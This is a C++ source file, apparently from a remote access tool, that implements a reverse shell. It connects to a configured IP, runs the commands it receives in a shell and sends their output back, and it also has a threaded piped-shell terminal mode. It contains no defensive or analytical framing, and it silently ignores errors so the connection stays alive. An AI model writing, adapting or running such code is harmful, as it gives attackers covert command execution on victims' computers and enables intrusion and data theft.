#include "analyze.h"
#include "modes.h"
#include "tcp_socket.h"
#include "protocol.h"
#include "shell.h"
#include "explorer.h"
#include <thread>


void bMode_shell(json setting_s, unsigned int port){

    string ip = setting_s["ip"];
    // init
    tcp_socket pshell = tcp_socket(ip.c_str(), port);
    if (pshell.init_socket()!=0 || pshell.open_socket()!=0) {
		SETTING["rs:connect"] = 0;
		pshell.ts_cleanup();
		return;
    }

    while (SETTING["rs:connect"]){
        try{

            size_t lpacket_get = 0;
			// #2: get list with info & binary
			list<pair<size_t, char*>> list_packet = pshell.get_packet(lpacket_get);
			// #3: Make sure there isn't errors
			if (list_packet.size() == 0 || lpacket_get > MAX_LEN_PROTO) { deallocate_receive_proto(list_packet); break; }
			// #4: Take the list and concatenate into one packet
			char* packet = concatenate_to_char_ptr(list_packet, lpacket_get);
			// #5: analyzing this packet according to the following protocol
			pair<json, char*> _packet = GetBlockPacket(packet, lpacket_get);
			// #6: Make sure there isn't errors
			if (_packet.first == BLOCK_ERROR.first) { break; }
			// #7: len packet
			size_t lpacket_send = 0;
			// #8: command from server
			string command = _packet.first["cmd"];
			bool proxy = proxy_to_cmd(command);
            command = "\""+command+"\"";

            size_t length_out = 0;
			char* shell_stdout = run_pshell(command.c_str(), length_out, proxy);
			json info = json::parse("{}");
			char* packet_to_send = SetBlockPacket(info, shell_stdout, length_out, lpacket_send);
			// SUCCESS: send packet
			pshell.send_packet(packet_to_send, lpacket_send);
			// loop cleanup
			delete[] packet_to_send;
			delete[] _packet.second;
        }
        catch(exception&error){

        }
    }

    // cleanup
    pshell.ts_cleanup();
    SETTING["rs:connect"] = 0;
}


void bMode_shell_terminal(json setting_s, unsigned int port, const char* _app){
	string ip = setting_s["ip"];
	std::thread thrd([&] {socketPipeShell(ip.c_str(), port);});
	this_thread::sleep_for(.3s);
	thrd.detach(); 
}